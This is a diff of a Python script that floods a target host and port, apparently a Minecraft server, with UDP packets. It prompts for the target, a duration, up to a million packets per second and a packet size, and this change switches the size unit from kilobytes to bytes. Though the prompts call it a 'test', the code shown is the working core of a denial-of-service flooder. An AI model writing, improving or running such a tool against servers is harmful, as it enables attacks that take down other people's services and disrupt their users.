@@ -20,7 +20,7 @@ def send_packets(host, port, num_packets_per_second, duration, storage_per_packe
         end_time = time.time() + duration
         packets_sent = 0
         while time.time() < end_time and packets_sent < num_packets_per_second * duration:
-            heavy_packet = create_heavy_packet(storage_per_packet * 1024)  # Creating a heavy packet with size_in_bytes KB
+            heavy_packet = create_heavy_packet(storage_per_packet)  # Creating a heavy packet with size_in_bytes
             sock.sendto(heavy_packet, (host, port))  # Sending the heavy packet
             packets_sent += 1
             time.sleep(0.001)  # Send packets thousand per second
@@ -48,7 +48,7 @@ if __name__ == "__main__":
     minecraft_port = int(input("Target port: "))
     duration = int(input("Enter test duration (seconds, max 1000): "))
     num_packets_per_second = int(input("Amount of packets (Empty) (max 1000000): "))
-    storage_per_packet = int(input("Storage Per Packet (KB): "))
+    storage_per_packet = int(input("Storage Per Packet (in bytes): "))
     duration = min(duration, 1000)  # Limit max test duration to 1000 seconds
     num_packets_per_second = min(num_packets_per_second, 1000000)  # Limit max packets per second to 1000000
     total_packets_sent = send_packets(minecraft_host, minecraft_port, num_packets_per_second, duration, storage_per_packet)
